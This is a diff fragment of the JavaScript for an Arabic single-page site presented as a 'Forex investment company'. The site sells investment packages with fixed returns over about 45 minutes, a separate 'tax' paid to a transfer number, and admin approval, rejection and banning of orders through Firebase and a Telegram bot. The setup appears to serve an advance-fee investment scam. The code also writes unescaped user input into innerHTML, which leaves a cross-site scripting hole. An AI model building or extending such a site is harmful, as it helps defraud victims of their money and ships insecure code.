+                return;
+            }
+
+            resultDiv.innerHTML = '<p style="color:#b0c4e0;">جاري البحث...</p>';
+            const orders = await getOrderByPhone(phone);
+            if (orders.length === 0) {
+                resultDiv.innerHTML = '<p style="color:#ff6b6b;">لا توجد طلبات لهذا الرقم</p>';
+                return;
+            }
+
+            const latest = orders.sort((a, b) => b.timestamp - a.timestamp)[0];
+            const statusClass = latest.status === 'pending' ? 'pending' : latest.status === 'accepted' ? 'accepted' : 'rejected';
+            const statusText = latest.status === 'pending' ? 'قيد المراجعة' : latest.status === 'accepted' ? 'مقبول ✅' : 'مرفوض ❌';
+
+            let html = `
+                <div class="order-item" style="margin-top:12px;">
                     <div class="order-header">
                         <div>
-                            <strong style="color:#fff;">${order.name}</strong>
-                            <span style="color:#8a9bb8; margin-right:10px;">📱 ${order.phone}</span>
+                            <strong style="color:#fff;">${latest.name}</strong>
+                            <span style="color:#8a9bb8; margin-right:10px;">📱 ${latest.phone}</span>
                         </div>
                         <div>
                             <span class="order-status ${statusClass}">${statusText}</span>
-                            <span style="color:#5e6f8a; font-size:0.8rem; margin-right:8px;">${date}</span>
                         </div>
                     </div>
                     <div style="color:#b0c4e0; font-size:0.9rem; margin-top:4px;">
-                        الباقة: ${order.package} | الضريبة: ${order.tax || 0} جنيه
+                        الباقة: ${latest.package} | الضريبة: ${latest.tax || 0} جنيه
                     </div>
-                    ${order.reason ? `<div class="order-reason">سبب الرفض: ${order.reason}</div>` : ''}
-                    ${order.status === 'pending' ? `
-                        <div class="order-actions">
-                            <button class="btn-sm btn-accept" onclick="acceptOrder('${order.orderId || index}')">
-                                <i class="fas fa-check"></i> قبول
-                            </button>
-                            <button class="btn-sm btn-reject" onclick="rejectOrder('${order.orderId || index}')">
-                                <i class="fas fa-times"></i> رفض
-                            </button>
-                            <button class="btn-sm btn-del" onclick="banUserFromOrder('${order.phone}')">
-                                <i class="fas fa-ban"></i> حظر
-                            </button>
-                        </div>
-                    ` : ''}
+                    ${latest.reason ? `<div class="order-reason">سبب الرفض: ${latest.reason}</div>` : ''}
+                    <div style="color:#5e6f8a; font-size:0.8rem; margin-top:6px;">
+                        تاريخ الطلب: ${new Date(latest.timestamp).toLocaleString('ar-EG')}
+                    </div>
                 </div>
             `;
+            resultDiv.innerHTML = html;
         });
-        container.innerHTML = html;
 
-        window.acceptOrder = async function(orderId) {
-            if (confirm('تأكيد قبول هذا الطلب؟')) {
-                await updateOrderStatus(orderId, 'accepted');
-                loadOrders();
-            }
-        };
-
-        window.rejectOrder = async function(orderId) {
-            const reason = prompt('أدخل سبب الرفض (سيظهر للمستخدم):');
-            if (reason !== null) {
-                await updateOrderStatus(orderId, 'rejected', reason.trim() || 'لم يتم تحديد سبب');
-                loadOrders();
-            }
-        };
-
-        window.banUserFromOrder = async function(phone) {
-            if (confirm(`هل تريد حظر المستخدم (${phone}) من الموقع؟`)) {
-                await banUser(phone, '');
-                const orders = await getOrders();
-                const userOrders = orders.filter(o => o.phone === phone && o.status === 'pending');
-                for (let o of userOrders) {
-                    await updateOrderStatus(o.orderId, 'rejected', 'تم حظر المستخدم');
-                }
-                loadOrders();
-                loadBannedUsers();
-            }
-        };
-    }
-
-    // ============================================================
-    //  LOAD BANNED USERS
-    // ============================================================
-    async function loadBannedUsers() {
-        const container = document.getElementById('bannedList');
-        if (!container) return;
-        container.innerHTML = '<p style="color:#5e6f8a; text-align:center; padding:20px;">جاري تحميل المحظورين...</p>';
-
-        const banned = await getBannedUsers();
-        if (banned.length === 0) {
-            container.innerHTML = '<p style="color:#5e6f8a; text-align:center; padding:20px;">لا يوجد مستخدمون محظورون</p>';
-            return;
+        // استعادة التايمر إذا كانت الصفحة محفوظة
+        if (document.getElementById('page-timer').classList.contains('active')) {
+            restoreTimerBackground();
         }
 
-        let html = '';
-        banned.forEach((user, index) => {
-            const date = new Date(user.timestamp).toLocaleString('ar-EG');
-            html += `
-                <div class="order-item">
-                    <div>
-                        <strong style="color:#fff;">📱 ${user.phone}</strong>
-                        <span style="color:#8a9bb8; margin-right:10px;">🌐 ${user.ip || 'غير معروف'}</span>
-                        <span style="color:#5e6f8a; font-size:0.8rem; margin-right:8px;">${date}</span>
-                    </div>
-                    <button class="btn-sm btn-accept" onclick="unbanUserFromList('${user.phone}')" style="margin-top:6px;">
-                        <i class="fas fa-user-check"></i> إلغاء الحظر
-                    </button>
-                </div>
-            `;
-        });
-        container.innerHTML = html;
-
-        window.unbanUserFromList = async function(phone) {
-            if (confirm(`إلغاء حظر المستخدم (${phone})؟`)) {
-                await unbanUser(phone);
-                loadBannedUsers();
-            }
-        };
-    }
-
-    // ============================================================
-    //  UNBAN
-    // ============================================================
-    document.getElementById('unbanUserBtn')?.addEventListener('click', async function() {
-        const phone = document.getElementById('unbanPhone').value.trim();
-        if (!phone) {
-            showToast('يرجى إدخال رقم الهاتف', 'warning');
-            return;
-        }
-        await unbanUser(phone);
-        document.getElementById('unbanPhone').value = '';
-        loadBannedUsers();
-    });
-
-    // ============================================================
-    //  ADMIN SETTINGS
-    // ============================================================
-    function loadAdminDashboard() {
-        const settings = loadSettings();
-        document.getElementById('adminBotToken').value = settings.botToken || DEFAULT_BOT_TOKEN;
-        document.getElementById('adminChatId').value = settings.chatId || DEFAULT_CHAT_ID;
-        document.getElementById('adminPaymentNumber').value = settings.paymentNumber || DEFAULT_PAYMENT_NUMBER;
-        document.getElementById('paymentNumberDisplay').textContent = settings.paymentNumber || DEFAULT_PAYMENT_NUMBER;
-        document.getElementById('taxPaymentNumber').textContent = settings.paymentNumber || DEFAULT_PAYMENT_NUMBER;
-
-        renderAdminPackages(settings);
-        renderUserPackages(settings);
-        loadOrders();
-        loadBannedUsers();
-    }
-
-    // ============================================================
-    //  ADMIN BUTTONS
-    // ============================================================
-    document.getElementById('saveToFirebaseBtn')?.addEventListener('click', async function() {
-        const settings = loadSettings();
-        await saveToFirebase(settings);
-    });
-
-    document.getElementById('loadFromFirebaseBtn')?.addEventListener('click', async function() {
-        await loadFromFirebase();
-        loadOrders();
-        loadBannedUsers();
-    });
-
-    document.getElementById('saveBotSettingsBtn')?.addEventListener('click', function() {
-        const token = document.getElementById('adminBotToken').value.trim();
-        const chatId = document.getElementById('adminChatId').value.trim();
-        if (!token || !chatId) {
-            showToast('يرجى إدخال التوكن والمعرف', 'warning');
-            return;
-        }
-        const settings = loadSettings();
-        settings.botToken = token;
-        settings.chatId = chatId;
-        saveSettings(settings);
-        showToast('تم حفظ إعدادات البوت محلياً');
-    });
-
-    document.getElementById('savePaymentNumberBtn')?.addEventListener('click', function() {
-        const num = document.getElementById('adminPaymentNumber').value.trim();
-        if (!num) {
-            showToast('يرجى إدخال رقم صحيح', 'warning');
-            return;
-        }
-        const settings = loadSettings();
-        settings.paymentNumber = num;
-        saveSettings(settings);
-        showToast('تم تحديث رقم التحويل محلياً');
-    });
-
-    document.getElementById('addPackageBtn')?.addEventListener('click', function() {
-        const name = document.getElementById('newPkgName').value.trim();
-        const price = parseFloat(document.getElementById('newPkgPrice').value);
-        const returnAmt = parseFloat(document.getElementById('newPkgReturn').value);
-        const tax = parseFloat(document.getElementById('newPkgTax').value);
-        const duration = document.getElementById('newPkgDuration').value.trim() || '45 دقيقة';
-
-        if (!name || isNaN(price) || isNaN(returnAmt) || isNaN(tax)) {
-            showToast('يرجى ملء جميع الحقول بشكل صحيح', 'warning');
-            return;
-        }
-        const settings = loadSettings();
-        settings.packages.push({ name, price, returnAmount: returnAmt, tax, duration });
-        saveSettings(settings);
-        document.getElementById('newPkgName').value = '';
-        document.getElementById('newPkgPrice').value = '';
-        document.getElementById('newPkgReturn').value = '';
-        document.getElementById('newPkgTax').value = '';
-        document.getElementById('newPkgDuration').value = '';
-        showToast('تم إضافة الباقة محلياً');
-    });
-
-    // ============================================================
-    //  CHECK ORDER STATUS
-    // ============================================================
-    document.getElementById('checkOrderStatusBtn')?.addEventListener('click', () => {
-        showPage('page-order-status');
-    });
-
-    document.getElementById('backToLandingFromStatus')?.addEventListener('click', () => {
-        localStorage.removeItem(PAGE_KEY);
-        showPage('page-landing');
-    });
-
-    document.getElementById('checkStatusBtn')?.addEventListener('click', async function() {
-        const phone = document.getElementById('statusPhoneInput').value.trim();
-        const resultDiv = document.getElementById('orderStatusResult');
-        if (!phone) {
-            resultDiv.innerHTML = '<p style="color:#f5a342;">يرجى إدخال رقم الهاتف</p>';
-            return;
-        }
-
-        resultDiv.innerHTML = '<p style="color:#b0c4e0;">جاري البحث...</p>';
-        const orders = await getOrderByPhone(phone);
-        if (orders.length === 0) {
-            resultDiv.innerHTML = '<p style="color:#ff6b6b;">لا توجد طلبات لهذا الرقم</p>';
-            return;
-        }
-
-        const latest = orders.sort((a, b) => b.timestamp - a.timestamp)[0];
-        const statusClass = latest.status === 'pending' ? 'pending' : latest.status === 'accepted' ? 'accepted' : 'rejected';
-        const statusText = latest.status === 'pending' ? 'قيد المراجعة' : latest.status === 'accepted' ? 'مقبول ✅' : 'مرفوض ❌';
-
-        let html = `
-            <div class="order-item" style="margin-top:12px;">
-                <div class="order-header">
-                    <div>
-                        <strong style="color:#fff;">${latest.name}</strong>
-                        <span style="color:#8a9bb8; margin-right:10px;">📱 ${latest.phone}</span>
-                    </div>
-                    <div>
-                        <span class="order-status ${statusClass}">${statusText}</span>
-                    </div>
-                </div>
-                <div style="color:#b0c4e0; font-size:0.9rem; margin-top:4px;">
-                    الباقة: ${latest.package} | الضريبة: ${latest.tax || 0} جنيه
-                </div>
-                ${latest.reason ? `<div class="order-reason">سبب الرفض: ${latest.reason}</div>` : ''}
-                <div style="color:#5e6f8a; font-size:0.8rem; margin-top:6px;">
-                    تاريخ الطلب: ${new Date(latest.timestamp).toLocaleString('ar-EG')}
-                </div>
-            </div>
-        `;
-        resultDiv.innerHTML = html;
-    });
-
-    // ============================================================
-    //  INIT
-    // ============================================================
-    (async function init() {
+        // تحميل الإعدادات الأولية
         const settings = loadSettings();
         document.getElementById('paymentNumberDisplay').textContent = settings.paymentNumber || DEFAULT_PAYMENT_NUMBER;
         document.getElementById('taxPaymentNumber').textContent = settings.paymentNumber || DEFAULT_PAYMENT_NUMBER;
         renderUserPackages(settings);
 
-        try {
-            const snapshot = await database.ref('settings').once('value');
-            const data = snapshot.val();
-            if (data) {
-                const current = loadSettings();
-                const merged = { ...current, ...data };
-                if (merged.packages && Array.isArray(merged.packages)) {
-                    saveSettings(merged);
-                    updateCloudStatus(true);
+        // تحميل من Firebase
+        (async function() {
+            try {
+                const snapshot = await database.ref('settings').once('value');
+                const data = snapshot.val();
+                if (data) {
+                    const current = loadSettings();
+                    const merged = { ...current, ...data };
+                    if (merged.packages && Array.isArray(merged.packages)) {
+                        saveSettings(merged);
+                        updateCloudStatus(true);
+                    }
                 }
+            } catch (e) {
+                updateCloudStatus(false);
+                console.log('لم يتم التحميل من Firebase');
             }
-        } catch (e) {
-            updateCloudStatus(false);
-            console.log('لم يتم التحميل من Firebase');
-        }
+        })();
 
+        // استعادة الصفحة المحفوظة
         const restored = restoreSavedPage();
         if (!restored) {
             showPage('page-landing');
@@ -2241,7 +2149,7 @@
         }
 
         console.log('🚀 شركة فوركس للأستثمار - النظام جاهز 100%');
-    })();
+    });
 </script>
 
 </body>
